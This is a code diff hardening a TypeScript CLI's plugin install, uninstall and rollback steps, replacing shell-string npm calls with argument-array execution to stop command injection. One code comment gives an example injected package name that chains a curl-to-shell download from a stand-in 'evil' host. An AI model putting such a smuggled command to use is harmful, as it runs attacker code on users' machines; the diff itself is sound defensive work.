@@ -1,6 +1,6 @@
 import { join } from "node:path";
 import { findProjectRoot } from "../lib/config.js";
-import { run } from "../lib/exec.js";
+import { run, runFile } from "../lib/exec.js";
 import {
   success,
   info,
@@ -33,11 +33,14 @@ export async function runPluginAdd(
   const overrides = opts?.override ?? false;
   const exportName = opts?.export ?? "default";
 
-  // 1. Install the package
+  // 1. Install the package. runFile (no shell) passes the spec as a single
+  // argv element, so a name copy-pasted from a README like `x;curl evil|sh`
+  // can't inject — while still supporting scoped names, versions, and
+  // file:/git specs that a validation allowlist would reject. (#HIGH)
   const spinner = createSpinner("Installing " + packageName + "...");
   spinner.start();
   try {
-    run("npm install " + packageName, { cwd: root });
+    runFile("npm", ["install", packageName], { cwd: root });
     spinner.succeed("Installed " + packageName);
   } catch (err) {
     spinner.fail("Failed to install " + packageName);
@@ -259,7 +262,7 @@ export async function runPluginRemove(packageName: string): Promise<void> {
 
   // Uninstall the package
   try {
-    run("npm uninstall " + packageName, { cwd: root });
+    runFile("npm", ["uninstall", packageName], { cwd: root });
   } catch {
     warn("npm uninstall failed. Run manually: npm uninstall " + packageName);
   }
@@ -270,7 +273,7 @@ export async function runPluginRemove(packageName: string): Promise<void> {
 function rollback(packageName: string, root: string): void {
   warn("Rolling back: uninstalling " + packageName);
   try {
-    run("npm uninstall " + packageName, { cwd: root });
+    runFile("npm", ["uninstall", packageName], { cwd: root });
   } catch {
     // best effort
   }
